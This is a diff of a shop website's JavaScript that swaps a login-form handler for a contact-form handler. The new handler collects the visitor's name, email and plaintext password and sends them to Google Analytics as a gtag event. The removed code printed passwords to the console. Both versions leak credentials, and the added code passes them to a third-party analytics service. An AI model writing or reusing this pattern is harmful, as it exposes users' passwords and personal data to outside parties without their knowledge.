@@ -32,27 +32,26 @@ document.addEventListener("DOMContentLoaded", function() {
     if (document.getElementById("cart-items")) {
         displayCart();
     }
-});
 
-document.addEventListener("DOMContentLoaded", function () {
-    const loginForm = document.getElementById("loginForm");
+    let form = document.getElementById("contact-form"); // Ensure your form has this ID
+    if (form) {
+        form.addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
 
-    if (loginForm) {
-        loginForm.addEventListener("submit", function (event) {
-            event.preventDefault(); // Prevent form submission
+            let name = document.getElementById("name")?.value || "Unknown";
+            let email = document.getElementById("email")?.value || "Unknown";
+            let password = document.getElementById("password")?.value || "Unknown";
+            let count = getCartItemCount(); // Get cart item count
 
-            let email = document.getElementById("email").value;
-            let password = document.getElementById("password").value;
+            gtag('event', 'contactform_event', {
+                username: name,
+                useremail: email,
+                userpassword: password,
+                cartcount: count,
+                submission_count: 1
+            });
 
-            console.log("Email:", email);
-            console.log("Password:", password);
+            alert("Form submitted successfully!");
         });
     }
 });
-gtag('event', 'contactform_event', {
-    username: name,
-    useremail: email,
-    userpassword: password,
-    submission_count: 1
-})
-
